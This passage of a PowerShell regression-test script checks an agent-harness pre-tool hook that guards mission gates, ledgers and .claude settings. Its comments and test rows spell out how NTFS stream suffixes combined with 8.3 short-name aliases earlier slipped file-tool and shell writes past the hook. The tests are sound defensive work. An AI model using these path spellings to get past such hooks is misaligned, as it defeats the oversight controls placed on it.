    if ($null -ne $h28SavedProj) { $env:CLAUDE_PROJECT_DIR = $h28SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h28SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h28SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h28SavedWt) { $env:LAM_WORKTREE = $h28SavedWt } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
    if ($null -ne $h28SavedMdi) { $env:MISSION_DISPATCH_ID = $h28SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h28Base -and (Test-Path -LiteralPath $h28Base)) {
        try { $null = Invoke-Wp1H18Git -Dir (Join-Path $h28Base 'main') -GitArgs @('worktree', 'remove', '--force', (Join-Path $h28Base 'main-worktrees\wt-D-E2W')) } catch { }
        try { Remove-Item -LiteralPath $h28Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h28F0Lines = @($h28F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h28F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h28detail = @"
  A CONTROL: the amendment 55 seat tripwire already reads a colon as a component boundary, so a stream-
  spelled mission-plane write from a LINKED seat is refused at the base as at the tip. This member proves
  the two routes diverged on the class (the tripwire anticipated the stream; T-3 and the protected tier
  did not, which E2-1/H-27 closes) and that E2-1's cure leaves the tripwire's verdicts unmoved.
    F-0, the fixture (a main checkout and a linked worktree of it):
$($h28F0Lines -join "`n")
      deny rows denied by the SEAT TRIPWIRE : $h28DenyOk of $h28DenyWant
      allow rows allowed                    : $h28AllowOk of $h28AllowWant
      divergences                           : $h28Bad   (expect 0)
      table reached                         : $h28Reached   (expect True -- 5 deny, 3 allow)
$($h28Lines -join "`n")
    THE TERRITORY TEST, ASKED DIRECTLY over stream spellings: $h28PredOk   (expect True)
$($h28Pred -join "`n")
  WHAT A RED ROW MEANS. A W- deny row that ALLOWS, or denies WITHOUT the seat tripwire's sentence, means
  the tripwire's colon boundary regressed. R-led denying means the strip or another rule fired at the
  root for a path that is neither a gate nor a protected path. W-out or W-rd denying means the tripwire
  widened past the plane.
"@
Check -Id 'H-28' -Title 'the same NTFS stream spelling against the amendment 55 seat tripwire, from a linked seat: a stream-spelled mission-plane write (the ledger, .mission-runtime/lam, the own .git, nested and notebook paths) is REFUSED by the tripwire''s own sentence, a read and a write outside the plane are not, and the same write from the root seat is allowed -- a control, green at the base and at the tip, that E2-1''s cure does not perturb (WP-E2, E2-2; ruling (v); amendment 55)' `
      -Ok $h28Ok -Detail $h28detail

# =============================================================================================
# H-29 -- THE 8.3 SHORT-NAME ALIAS COMBINED WITH AN NTFS STREAM: THE COMBINATION THAT DEFEATED THE
#         ALIAS RESOLVER (WP-E2 round 2; validator round 1's refutation). A stream suffix on an 8.3
#         short-name component -- MISSIO~1::$INDEX_ALLOCATION\gates\... -- reached the T-3 gate rule
#         AND, from a linked seat, the amendment-55 seat tripwire, because the stream broke the
#         component-name lookup the 8.3 resolver does. Stripped THEN resolved, both are refused.
# =============================================================================================
# THE CLASS, ONE SPELLING DEEPER. H-27 closed the plain stream against T-3 and the protected tier by
# adding the STRIPPED form; H-28 recorded the seat tripwire already read a colon. But the strip alone
# did not RE-RESOLVE: `MISSIO~1::$INDEX_ALLOCATION/gates` stripped to `MISSIO~1/gates`, and the 8.3
# alias was never inverted on it (the T-3 gate rule lives only in the delta candidate loop, which did
# not re-run Get-EvidencePathForms on the stripped form; the seat tripwire's own form builder had the
# same gap). So `MISSIO~1::$X/gates` was ALLOWED at the round-1 tip from the root seat AND the linked
# seat, and `MISSIO~1::$X/ledger` leaked past the seat tripwire from a linked seat -- a REAL write
# (cmd.exe lands it in the real directory). The cure strips, THEN resolves, in both places. This member
# drives the REAL hook over a hermetic fixture whose protected directories EXIST (so the volume gives
# them 8.3 short names, read here from the volume; an absent alias is a RED sentence, never a skip).
$h29Ok = $true
$h29Bad = 0
$h29DenyWant = 0; $h29DenyOk = 0; $h29AllowWant = 0; $h29AllowOk = 0
$h29Lines = New-Object System.Collections.Generic.List[string]
$h29F0 = [ordered]@{}
$h29FixtureOk = $false
$h29Reached = $false
$h29Base = ''
$h29SavedProj = $env:CLAUDE_PROJECT_DIR
$h29SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h29SavedWt   = $env:LAM_WORKTREE
$h29SavedMdi  = $env:MISSION_DISPATCH_ID
$a2c = '::$' + 'INDEX_ALLOCATION'
$aDc = '::$' + 'DATA'
$m29  = '.mission'
$mr29 = '.mission' + '-runtime'
$cl29 = '.cl' + 'aude'
function Get-Wp1H29Short { param([string]$Path) try { return [string](New-Object -ComObject Scripting.FileSystemObject).GetFolder($Path).ShortName } catch { return '' } }
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h29'
    $h29Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h29-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h29Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h29Base
    $h29Main = Join-Path $h29Base 'main'
    $h29Wt   = Join-Path $h29Base 'main-worktrees\wt-D-E29'
    $enc29 = New-Object System.Text.UTF8Encoding($false)
    $gi = Invoke-Wp1H18Git -Dir $h29Base -GitArgs @('init', '-q', 'main')
    $h29F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h29F0['M: its .git entry is a DIRECTORY (the root seat)'] = [System.IO.Directory]::Exists((Join-Path $h29Main '.git'))
    if ($h29F0['M: its .git entry is a DIRECTORY (the root seat)']) {
        [System.IO.File]::WriteAllText((Join-Path $h29Main 'seed.txt'), "seed`n", $enc29)
        $null = Invoke-Wp1H18Git -Dir $h29Main -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $h29Main -GitArgs @('commit', '-q', '-m', 'seed')
        $h29F0['M: one commit'] = ($gc.code -eq 0)
        $gw = Invoke-Wp1H18Git -Dir $h29Main -GitArgs @('worktree', 'add', '-q', '--detach', $h29Wt, 'HEAD')
        $h29F0['W: git worktree add succeeded (the linked seat)'] = ($gw.code -eq 0)
        # REAL protected/mission directories in BOTH trees, so the volume gives them 8.3 short names.
        foreach ($root in @($h29Main, $h29Wt)) {
            foreach ($d in @(($m29 + '\gates'), ($m29 + '\ledger'), ($m29 + '\evidence'), ($mr29 + '\evidence'), ($mr29 + '\lam'), $cl29, 'tools\framework\hooks', ($m29 + '\notes'), 'src')) {
                $null = New-Item -ItemType Directory -Force -Path (Join-Path $root $d) | Out-Null
            }
        }
        $h29aM   = Get-Wp1H29Short (Join-Path $h29Main $m29)
        $h29aMR  = Get-Wp1H29Short (Join-Path $h29Main $mr29)
        $h29aC   = Get-Wp1H29Short (Join-Path $h29Main $cl29)
        $h29aMw  = Get-Wp1H29Short (Join-Path $h29Wt $m29)
        $h29aMRw = Get-Wp1H29Short (Join-Path $h29Wt $mr29)
        $h29F0['M: .mission has an 8.3 alias (' + $h29aM + ')'] = ($h29aM -and ($h29aM -ne $m29))
        $h29F0['M: .mission-runtime has an 8.3 alias (' + $h29aMR + ')'] = ($h29aMR -and ($h29aMR -ne $mr29))
        $h29F0['M: .claude has an 8.3 alias (' + $h29aC + ')'] = ($h29aC -and ($h29aC -ne $cl29))
        $h29F0['W: .mission has an 8.3 alias (' + $h29aMw + ')'] = ($h29aMw -and ($h29aMw -ne $m29))
        $h29F0['W: .mission-runtime has an 8.3 alias (' + $h29aMRw + ')'] = ($h29aMRw -and ($h29aMRw -ne $mr29))
    }
    $h29F0['the fixture lies outside the repository under test'] = -not ($h29Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h29FixtureOk = (@($h29F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H29Row {
        param($Row)
        if ($Row.proj) { $env:CLAUDE_PROJECT_DIR = $Row.proj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
        Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
        try {
            $payload = @{ session_id = 'session-wp1-h29'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $Row.cwd } | ConvertTo-Json -Depth 8 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $trip     = ($res.stdout -like '*SEAT TRIPWIRE*')
        $t3       = ($res.stdout -like '*under .mission/gates*')
        $prot     = ($res.stdout -like '*protected path*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $trip; t3 = $t3; prot = $prot; exit = $res.exit; out = $res.stdout }
    }
    function New-H29Row {
        param([string]$Id, [string]$Proj, [string]$Tool, $Ti, [string]$Cwd, [string]$Want, [string]$Rule, [string]$Why)
        return [pscustomobject]@{ id = $Id; proj = $Proj; tool = $Tool; ti = $Ti; cwd = $Cwd; want = $Want; rule = $Rule; why = $Why }
    }
    $rows29 = @()
    if ($h29FixtureOk) {
        # ROOT seat (tripwire silent). The gate rule and the protected tier are the only defence.
        $rows29 += New-H29Row 'r1' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aM + $a2c + '\gates\push-x.yaml')); content = 'x' } $h29Main 'deny' 't3' 'the 8.3 alias of .mission PLUS a stream, on the gate (THE REFUTATION)'
        $rows29 += New-H29Row 'r2' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aM + $aDc + '\gates\push-x.yaml')); content = 'x' } $h29Main 'deny' 't3' 'the same with ::$DATA'
        $rows29 += New-H29Row 'r3' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aM + '\gates\push-x.yaml')); content = 'x' } $h29Main 'deny' 't3' 'the 8.3 alias ALONE (no stream): a control that was already denied'
        $rows29 += New-H29Row 'r4' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aM + $a2c + '\evidence\d\log.jsonl')); content = 'x' } $h29Main 'deny' 'prot' '8.3 + stream on .mission/evidence: A1 tier, already denied'
        $rows29 += New-H29Row 'r5' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aMR + $a2c + '\evidence\d\log.jsonl')); content = 'x' } $h29Main 'deny' 'prot' '8.3 + stream on .mission-runtime/evidence'
        $rows29 += New-H29Row 'r6' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aC + $a2c + '\settings.json')); content = 'x' } $h29Main 'deny' 'prot' '8.3 + stream on .claude/settings.json'
        $rows29 += New-H29Row 'r7' $h29Main 'Write' @{ file_path = (Join-Path $h29Main ($h29aM + $aDc + '\notes\x.txt')); content = 'x' } $h29Main 'allow' 'none' '8.3 + stream on .mission/NOTES -- a parent-only path, not a gate or protected (must ALLOW)'
        $rows29 += New-H29Row 'r8' $h29Main 'Read'  @{ file_path = (Join-Path $h29Main ($h29aM + $a2c + '\gates\push-x.yaml')) } $h29Main 'allow' 'none' 'a READ through the 8.3 + stream form'
        # LINKED seat (tripwire active). The gate rule fires before the tripwire; mission-plane paths
        # that are neither gate nor protected are the tripwire's.
        $rows29 += New-H29Row 'r9'  $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($h29aMw + $a2c + '\gates\push-x.yaml')); content = 'x' } $h29Wt 'deny' 't3' 'the gate, 8.3 + stream, from the LINKED seat (the gate rule, role-blind)'
        $rows29 += New-H29Row 'r10' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($h29aMw + $a2c + '\ledger\entries.jsonl')); content = 'x' } $h29Wt 'deny' 'trip' 'the ledger, 8.3 + stream, LINKED: the seat-tripwire residual (leaked at round 1)'
        $rows29 += New-H29Row 'r11' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($h29aMRw + $aDc + '\lam\h.py')); content = 'x' } $h29Wt 'deny' 'trip' '.mission-runtime/lam, 8.3 + stream, LINKED: the same residual'
        $rows29 += New-H29Row 'r12' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($h29aMw + '\ledger\entries.jsonl')); content = 'x' } $h29Wt 'deny' 'trip' 'the 8.3 alias ALONE on the ledger, LINKED: a control already denied by the tripwire'
        $rows29 += New-H29Row 'r13' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($m29 + $a2c + '\ledger\entries.jsonl')); content = 'x' } $h29Wt 'deny' 'trip' 'the PLAIN stream on the ledger, LINKED: a control already denied by the tripwire'
        $rows29 += New-H29Row 'r14' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ($h29aMw + $aDc + '\notes\x.txt')); content = 'x' } $h29Wt 'deny' 'trip' '8.3 + stream on .mission/notes from the LINKED seat: still under .mission, so the seat tripwire denies it (a ROOT seat allows the same path -- r7)'
        $rows29 += New-H29Row 'r16' $h29Wt 'Write' @{ file_path = (Join-Path $h29Wt ('src\x.py' + $aDc)); content = 'x' } $h29Wt 'allow' 'none' 'a stream OUTSIDE the plane, from the linked seat: the widening control (must ALLOW)'
        $rows29 += New-H29Row 'r15' $h29Wt 'Read'  @{ file_path = (Join-Path $h29Wt ($h29aMw + $a2c + '\ledger\entries.jsonl')) } $h29Wt 'allow' 'none' 'a READ through the 8.3 + stream form, linked seat'
    }
    foreach ($r in $rows29) {
        $v = Invoke-H29Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h29DenyWant++
            $attributed = switch ($r.rule) {
                't3'   { $v.t3 -and (-not $v.trip) }
                'prot' { $v.prot -and (-not $v.trip) }
                'trip' { $v.trip }
                default { $true }
            }
            $ok = $v.deny -and $attributed
            if ($ok) { $h29DenyOk++ }
        } else {
            $h29AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h29AllowOk++ }
        }
        if (-not $ok) { $h29Bad++ }
        $shown = if ($r.ti.Contains('file_path')) { '[' + $r.tool + '] ' + [string]$r.ti['file_path'] } else { '[' + $r.tool + ']' }
        if ($h29Base) { $shown = $shown.Replace($h29Base, '<base>') }
        [void]$h29Lines.Add(('      {0,-4} {1,-6} want={2,-5} rule={3,-4} exit={4} {5} {6}' -f $r.id, $(if ($r.proj -eq $h29Wt) { 'linked' } else { 'root' }), $r.want.ToUpperInvariant(), $r.rule, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        [void]$h29Lines.Add('           ' + $r.why + $(if (-not $ok) { '  ||  said: ' + ((([string]$v.out) -replace '\s+', ' ').Substring(0, [Math]::Min(220, ([string]$v.out).Length))) } else { '' }))
    }
    $h29Reached = $h29FixtureOk -and ($h29DenyWant -eq 12) -and ($h29AllowWant -eq 4)
    if (-not $h29FixtureOk -or ($h29Bad -gt 0) -or -not $h29Reached) { $h29Ok = $false }
} catch {
    $h29Ok = $false
    [void]$h29Lines.Add(("      H-29 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
    if ($null -ne $h29SavedProj) { $env:CLAUDE_PROJECT_DIR = $h29SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h29SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h29SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h29SavedWt) { $env:LAM_WORKTREE = $h29SavedWt } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
    if ($null -ne $h29SavedMdi) { $env:MISSION_DISPATCH_ID = $h29SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h29Base -and (Test-Path -LiteralPath $h29Base)) {
        try { $null = Invoke-Wp1H18Git -Dir (Join-Path $h29Base 'main') -GitArgs @('worktree', 'remove', '--force', (Join-Path $h29Base 'main-worktrees\wt-D-E29')) } catch { }
        try { Remove-Item -LiteralPath $h29Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h29F0Lines = @($h29F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h29F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h29detail = @"
  ONE QUESTION -- does the REAL hook refuse an 8.3-short-name-alias PLUS a stream on the gate (from either
  seat) and on a linked seat's mission plane, the combination validator round 1 found leaking past the
  round-1 cure because the strip was not RE-RESOLVED? The protected directories EXIST so the volume gives
  them real 8.3 short names, read from the volume here.
    F-0, the fixture and its 8.3 aliases:
$($h29F0Lines -join "`n")
      deny rows denied, each by its NAMED rule : $h29DenyOk of $h29DenyWant
      allow rows allowed                        : $h29AllowOk of $h29AllowWant
      divergences                               : $h29Bad   (expect 0)
      table reached                             : $h29Reached   (expect True -- 12 deny, 4 allow)
$($h29Lines -join "`n")
  WHAT A RED ROW MEANS. r1, r2, r9 (gate, 8.3 + stream) or r10, r11 (a linked seat's mission plane, 8.3 +
  stream) that ALLOW is validator round 1's refutation, unfixed: the strip was not re-resolved. A control
  (r3-r6, r12, r13, r14) that allows means an ordinary 8.3/plain-stream/linked-plane deny regressed. An ALLOW
  row (r7, r8, r15, r16) that denies means the re-resolution widened past the class -- a root-seat parent-only
  path, a read, or a non-.mission path.
  ABSENT 8.3 aliases (F-0) is a RED sentence: the volume must give .mission a short name for this to drive.
"@
Check -Id 'H-29' -Title 'the 8.3 short-name alias combined with an NTFS stream is refused on the gate from either seat and on a linked seat''s mission plane -- the strip is RE-RESOLVED, not just stripped (WP-E2 round 2; validator round 1''s refutation); the 8.3-alone and plain-stream controls stay denied, and a parent-only path and a read stay allowed' `
      -Ok $h29Ok -Detail $h29detail

# =============================================================================================
# H-30 -- THE 8.3 ALIAS + STREAM ON THE TWO ROUTES ROUND 2 DID NOT RE-RESOLVE: THE NESTED (DEEP)
#         FILE-TOOL OFFER TO A1'S PROTECTED TIER, AND THE SHELL ROUTE (WP-E2 round 3; validator round 2)
# =============================================================================================
# VALIDATOR ROUND 2 REFUTED the round-2 cure: a NESTED path (edits[].file_path, or any path/file_path
# below the top level) carrying an 8.3 short-name alias plus a stream --
# MISSIO~1::$INDEX_ALLOCATION\evidence\p.txt -- reached A1's protected tier UN-resolved and was ALLOWED
# for the root-seat role, because the deep-path offer stripped the stream but did not re-invert the 8.3
# alias (even a nested 8.3-alone path leaked). It also observed, out of the file-tool claim, that the
# SHELL route allowed cp MISSIO~1::$X\gates -- an 8.3 alias names no `.mission` literal, so A1's
# metacharacter+parent tier (which closes the PLAIN stream) misses it. Round 3 closes both: the deep
# offer uses the same Get-EvidenceA1OfferForms builder the top-level offer uses, and the shell route
# offers the stream-stripped command through Get-EvidencePathForms so the alias inverts. This member
# drives the REAL hook over a hermetic root-seat fixture whose protected directories EXIST (so the
# volume gives them real 8.3 short names, read from the volume; an absent alias is a RED sentence).
$h30Ok = $true
$h30Bad = 0
$h30DenyWant = 0; $h30DenyOk = 0; $h30AllowWant = 0; $h30AllowOk = 0
$h30Lines = New-Object System.Collections.Generic.List[string]
$h30F0 = [ordered]@{}
$h30FixtureOk = $false
$h30Reached = $false
$h30Base = ''
$h30SavedProj = $env:CLAUDE_PROJECT_DIR
$h30SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h30SavedMdi  = $env:MISSION_DISPATCH_ID
$a2d = '::$' + 'INDEX_ALLOCATION'
$aDd = '::$' + 'DATA'
$m30  = '.mission'
$cl30 = '.cl' + 'aude'
function Get-Wp1H30Short { param([string]$Path) try { return [string](New-Object -ComObject Scripting.FileSystemObject).GetFolder($Path).ShortName } catch { return '' } }
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h30'
    $h30Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h30-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h30Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h30Base
    $h30Main = Join-Path $h30Base 'main'
    $enc30 = New-Object System.Text.UTF8Encoding($false)
    $gi = Invoke-Wp1H18Git -Dir $h30Base -GitArgs @('init', '-q', 'main')
    $h30F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h30F0['M: its .git entry is a DIRECTORY (the root seat)'] = [System.IO.Directory]::Exists((Join-Path $h30Main '.git'))
    if ($h30F0['M: its .git entry is a DIRECTORY (the root seat)']) {
        [System.IO.File]::WriteAllText((Join-Path $h30Main 'seed.txt'), "seed`n", $enc30)
        $null = Invoke-Wp1H18Git -Dir $h30Main -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $h30Main -GitArgs @('commit', '-q', '-m', 'seed')
        $h30F0['M: one commit'] = ($gc.code -eq 0)
        foreach ($d in @(($m30 + '\gates'), ($m30 + '\evidence'), ($m30 + '\notes'), $cl30, 'src')) {
            $null = New-Item -ItemType Directory -Force -Path (Join-Path $h30Main $d) | Out-Null
        }
        $h30aM = Get-Wp1H30Short (Join-Path $h30Main $m30)
        $h30aC = Get-Wp1H30Short (Join-Path $h30Main $cl30)
        $h30F0['M: .mission has an 8.3 alias (' + $h30aM + ')'] = ($h30aM -and ($h30aM -ne $m30))
        $h30F0['M: .claude has an 8.3 alias (' + $h30aC + ')'] = ($h30aC -and ($h30aC -ne $cl30))
    }
    $h30F0['the fixture lies outside the repository under test'] = -not ($h30Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h30FixtureOk = (@($h30F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H30Row {
        param($Row)
        $env:CLAUDE_PROJECT_DIR = $h30Main
        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
        try {
            $payload = @{ session_id = 'session-wp1-h30'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $h30Main } | ConvertTo-Json -Depth 10 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $trip     = ($res.stdout -like '*SEAT TRIPWIRE*')
        $t3       = ($res.stdout -like '*under .mission/gates*') -or ($res.stdout -like '*references .mission/gates*')
        $prot     = ($res.stdout -like '*protected path*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $trip; t3 = $t3; prot = $prot; exit = $res.exit; out = $res.stdout }
    }
    function New-H30Row {
        param([string]$Id, [string]$Tool, $Ti, [string]$Want, [string]$Rule, [string]$Why)
        return [pscustomobject]@{ id = $Id; tool = $Tool; ti = $Ti; want = $Want; rule = $Rule; why = $Why }
    }
    $evP  = (Join-Path $h30Main ($h30aM + $a2d + '\evidence\p.txt'))
    $evP2 = (Join-Path $h30Main ($h30aM + '\evidence\p.txt'))
    $clP  = (Join-Path $h30Main ($h30aC + $a2d + '\settings.json'))
    $rows30 = @()
    if ($h30FixtureOk) {
        # NESTED (deep-path) file-tool offer to A1's protected tier -- the refutation.
        $rows30 += New-H30Row 'n1' 'Edit' @{ edits = @(@{ file_path = $evP; old_string='a'; new_string='b' }) } 'deny' 'prot' 'nested edits[].file_path, .mission/evidence, 8.3 + stream (THE REFUTATION)'
        $rows30 += New-H30Row 'n2' 'Edit' @{ edits = @(@{ file_path = $evP2; old_string='a'; new_string='b' }) } 'deny' 'prot' 'nested edits[].file_path, 8.3 alone (the deep offer applied no 8.3 either)'
        $rows30 += New-H30Row 'n3' 'MultiEdit' @{ wrap = @{ path = $clP } } 'deny' 'prot' 'nested under an arbitrary key {wrap:{path}}, .claude/settings.json, 8.3 + stream'
        $rows30 += New-H30Row 'n4' 'MultiEdit' @{ edits = @(@{ file_path = (Join-Path $h30Main ($h30aM + $a2d + '\gates\x.yaml')); old_string='a'; new_string='b' }) } 'deny' 't3' 'nested to the gate, 8.3 + stream: the candidate loop already covered this (control)'
        # SHELL route -- the out-of-scope observation, now cured.
        $rows30 += New-H30Row 's1' 'Bash' @{ command = ('cp seed.txt ' + $h30aM + $a2d + '/gates/x.yaml') } 'deny' 'any' 'shell cp, gate, 8.3 + stream: a gate MINT (the metacharacter tier missed the 8.3 alias)'
        $rows30 += New-H30Row 's2' 'Bash' @{ command = ('cp seed.txt ' + $h30aM + $a2d + '/evidence/log.jsonl') } 'deny' 'any' 'shell cp, .mission/evidence, 8.3 + stream'
        $rows30 += New-H30Row 's3' 'PowerShell' @{ command = ('Set-Content -LiteralPath ' + $h30aM + $a2d + '\evidence\log.jsonl -Value x') } 'deny' 'any' 'shell Set-Content, 8.3 + stream, evidence'
        $rows30 += New-H30Row 's4' 'Bash' @{ command = ('cp seed.txt ' + $m30 + $a2d + '/gates/x.yaml') } 'deny' 'any' 'shell cp, PLAIN stream on the gate: a control -- denied at round 2 by A1''s metacharacter+parent tier, and at round 3 by T-3 via the stream-stripped command; either is a deny'
        # ALLOW controls -- the cure narrows, not widens.
        $rows30 += New-H30Row 'a1' 'Edit' @{ edits = @(@{ file_path = (Join-Path $h30Main ('src\x.py' + $aDd)); old_string='a'; new_string='b' }) } 'allow' 'none' 'nested, a stream OUTSIDE protected (must ALLOW)'
        $rows30 += New-H30Row 'a2' 'Bash' @{ command = ('cp seed.txt src/x.py' + $aDd) } 'allow' 'none' 'shell, a stream outside protected (must ALLOW)'
        $rows30 += New-H30Row 'a3' 'Edit' @{ edits = @(@{ file_path = (Join-Path $h30Main ($h30aM + $aDd + '\notes\x.txt')); old_string='a'; new_string='b' }) } 'allow' 'none' 'nested, 8.3 + stream on .mission/NOTES -- parent-only from the root seat (must ALLOW)'
    }
    foreach ($r in $rows30) {
        $v = Invoke-H30Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h30DenyWant++
            $attributed = switch ($r.rule) { 't3' { $v.t3 } 'prot' { $v.prot } default { $true } }
            $ok = $v.deny -and $attributed -and (-not $v.trip)
            if ($ok) { $h30DenyOk++ }
        } else {
            $h30AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h30AllowOk++ }
        }
        if (-not $ok) { $h30Bad++ }
        $shown = if ($r.ti.Contains('command')) { [string]$r.ti['command'] } else { '[' + $r.tool + '] (nested path)' }
        if ($h30Base) { $shown = $shown.Replace($h30Base, '<base>') }
        [void]$h30Lines.Add(('      {0,-4} want={1,-5} rule={2,-4} exit={3} {4} {5}' -f $r.id, $r.want.ToUpperInvariant(), $r.rule, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        [void]$h30Lines.Add('           ' + $r.why + $(if (-not $ok) { '  ||  said: ' + ((([string]$v.out) -replace '\s+', ' ').Substring(0, [Math]::Min(220, ([string]$v.out).Length))) } else { '' }))
    }
    $h30Reached = $h30FixtureOk -and ($h30DenyWant -eq 8) -and ($h30AllowWant -eq 3)
    if (-not $h30FixtureOk -or ($h30Bad -gt 0) -or -not $h30Reached) { $h30Ok = $false }
} catch {
    $h30Ok = $false
    [void]$h30Lines.Add(("      H-30 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
    if ($null -ne $h30SavedProj) { $env:CLAUDE_PROJECT_DIR = $h30SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h30SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h30SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h30SavedMdi) { $env:MISSION_DISPATCH_ID = $h30SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h30Base -and (Test-Path -LiteralPath $h30Base)) {
        try { Remove-Item -LiteralPath $h30Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h30F0Lines = @($h30F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h30F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h30detail = @"
  ONE QUESTION -- does the REAL hook refuse an 8.3-alias + stream on the two routes round 2 did not
  re-resolve: a NESTED (deep) file-tool path reaching A1's protected tier, and a SHELL command? The deep
  offer now uses the same form builder as the top-level offer; the shell route offers the stream-stripped
  command through Get-EvidencePathForms.
    F-0, the fixture and its 8.3 aliases:
$($h30F0Lines -join "`n")
      deny rows denied, each by its NAMED tier (t3 / prot, never trip) : $h30DenyOk of $h30DenyWant
      allow rows allowed                                                : $h30AllowOk of $h30AllowWant
      divergences                                                        : $h30Bad   (expect 0)
      table reached                                                      : $h30Reached   (expect True -- 8 deny, 3 allow)
$($h30Lines -join "`n")
  WHAT A RED ROW MEANS. n1, n2, n3 (a nested path to a protected member) or s1, s2, s3 (a shell command
  naming one, 8.3 + stream) that ALLOW is validator round 2's class, unfixed on that route. n4 (nested
